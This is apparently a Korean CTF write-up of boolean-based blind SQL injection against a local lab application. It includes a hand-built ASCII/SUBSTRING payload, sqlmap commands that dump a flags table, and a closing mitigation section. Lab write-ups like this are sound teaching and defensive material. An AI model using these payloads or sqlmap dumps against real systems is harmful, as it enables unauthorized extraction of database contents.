+++
title = "VulnABLE CTF [LUXORA]: SQL Injection 🥇 Gold (Boolean Blind SQLi)"
description = "LUXORA 플랫폼의 SQL Injection Gold 난이도 플래그 획득 시나리오 및 Blind SQLi 원리 분석"
date = 2026-03-14
[extra]
categories = "pentesting"
tags = ["CTF", "LUXORA", "SQL Injection", "Gold", "Blind SQLi"]
+++

# VulnABLE CTF [LUXORA]: SQL Injection 🥇 Gold

이전까지는 쿼리 결과나 에러 메시지가 화면에 직접 출력되는(In-band) 방식이었습니다. 하지만 **Gold 난이도**인 `/sqli/gold` 라우트에서는 화면에 아무런 에러 메시지도, 데이터베이스의 데이터도 출력되지 않습니다. 

오직 **"결과가 존재합니다(True)"** 혹은 **"결과가 없습니다(False)"** 두 가지 반응만 보일 뿐입니다. 이렇게 눈을 가린 상태에서 데이터를 빼내는 기법을 **Boolean-based Blind SQL Injection**이라고 합니다.

---

## 🕒 1. 타겟 탐색 및 반응 분석 (Reconnaissance)

`/sqli/gold` 페이지는 상품의 재고가 있는지 확인하는 기능입니다.

* `GET /sqli/gold?product_id=1` ➔ 화면 출력: `✅ In Stock`
* `GET /sqli/gold?product_id=999` (없는 상품) ➔ 화면 출력: `❌ Out of Stock`

**[해커의 사고 과정]**
* 입력값에 홑따옴표 `'`를 넣어봤지만, 서버는 그냥 `❌ Out of Stock`이라고만 하고 에러를 뱉지 않습니다.
* 하지만 참(True)일 때와 거짓(False)일 때 화면의 출력(`✅` vs `❌`)이 명확히 다릅니다!
* 이를 이용해 데이터베이스에 **스무고개(Yes/No 질문)**를 던져서 데이터를 한 글자씩 유추해낼 수 있습니다.

---

## 🕒 2. 취약점 식별 및 질문(Payload) 설계 (Exploitation)

스무고개를 시작해 봅시다. 우리의 목표는 관리자의 비밀번호나 플래그를 찾는 것입니다. 우선 데이터베이스의 이름을 한 글자씩 알아내보겠습니다.

### 💡 공격 원리: SUBSTRING과 ASCII
데이터베이스의 이름을 구하는 함수 `database()`의 첫 글자가 'l'(소문자 엘, 아스키코드 108)인지 물어보는 쿼리를 만듭니다.

* 쿼리: `1 AND ASCII(SUBSTRING(database(), 1, 1)) = 108`
* 의미: "product_id가 1이고(참), 데이터베이스 이름의 첫 번째 글자 아스키코드가 108(l)이 맞니?"

만약 맞다면 화면에 `✅ In Stock`이 뜨고, 아니라면 `❌ Out of Stock`이 뜹니다.

### 🚀 페이로드 전송 (수동 테스트)
URL 인코딩을 거쳐 요청을 보냅니다.

```http
# 첫 글자가 108('l')인지 확인
GET /sqli/gold?product_id=1%20AND%20ASCII(SUBSTRING(database(),1,1))=108

# 결과: ✅ In Stock
```
첫 글자가 `l`임을 알아냈습니다! 이런 식으로 두 번째 글자, 세 번째 글자를 계속 물어보며 데이터베이스 이름(`luxora_db`)을 알아냅니다.

---

## 🕒 3. 자동화 도구 활용 (sqlmap)

사람이 일일이 스무고개를 하면 플래그 하나를 찾는 데 몇 달이 걸릴 수도 있습니다. 모의해커는 이런 노가다를 자동화해주는 마법의 도구, **sqlmap**을 사용합니다.

```bash
# sqlmap을 이용해 Blind SQLi 취약점 자동 점검 및 DB 이름 추출
$ sqlmap -u "http://localhost:3000/sqli/gold?product_id=1" --technique=B --dbs --batch
```

**[명령어 설명]**
* `--technique=B`: Boolean-based Blind 기법만 사용하도록 강제합니다.
* `--dbs`: 데이터베이스 목록을 가져오라고 지시합니다.
* `--batch`: 묻는 말에 모두 기본값(Default)으로 자동 대답합니다.

### 🔍 sqlmap 구동 및 플래그 덤프
`sqlmap`이 초당 수십 번의 스무고개를 던지며 데이터를 긁어옵니다. 데이터베이스 안에 `flags`라는 테이블이 있음을 확인하고 내용을 뽑아냅니다.

```bash
# flags 테이블의 내용을 덤프(Dump)
$ sqlmap -u "http://localhost:3000/sqli/gold?product_id=1" -D luxora_db -T flags --dump --batch
```

```text
Database: luxora_db
Table: flags
[1 entry]
+----+----------------------------------+
| id | flag_value                       |
+----+----------------------------------+
| 1  | FLAG{SQLI_🥇_BLIND_B7E412}       |
+----+----------------------------------+
```

---

## 🕒 4. 플래그 획득 및 원리 요약 🚩

**플래그 획득:** `FLAG{SQLI_🥇_BLIND_B7E412}`

### 📝 왜 이런 공격이 성공했는가?
개발자는 화면에 에러나 데이터를 직접 노출하지 않았기 때문에(Blind) 안전할 것이라 착각했습니다. 하지만 백엔드 로직이 여전히 파라미터화되지 않은 쿼리(문자열 결합)를 사용하고 있었고, 참/거짓에 따른 **응답의 미세한 차이(UI 변화)**를 통해 데이터베이스에 논리적 질문을 던질 수 있는 통로를 열어두었습니다.

### 🛡️ 방어 대책 (Mitigation)
Blind SQLi 역시 근본적인 원인은 SQL 문법의 구조가 깨지는 데 있습니다.
1. **Prepared Statements 필수 사용**: 화면 출력 여부와 상관없이 모든 데이터베이스 통신은 구조와 데이터를 분리해야 합니다.
2. **에러 메시지 일원화**: 참/거짓에 따라 화면 상태가 달라지지 않도록 비즈니스 로직을 점검해야 합니다. 다만 이 경우에도 응답 시간의 차이를 이용하는 Time-based Blind SQLi 공격이 가능하므로, 1번 대책이 가장 핵심입니다.

다음 시간에는 화면 변화조차 없는 상태에서 '시간'을 이용해 스무고개를 하는 **Platinum 💎 (Time-based Blind SQLi)** 기법을 다루겠습니다!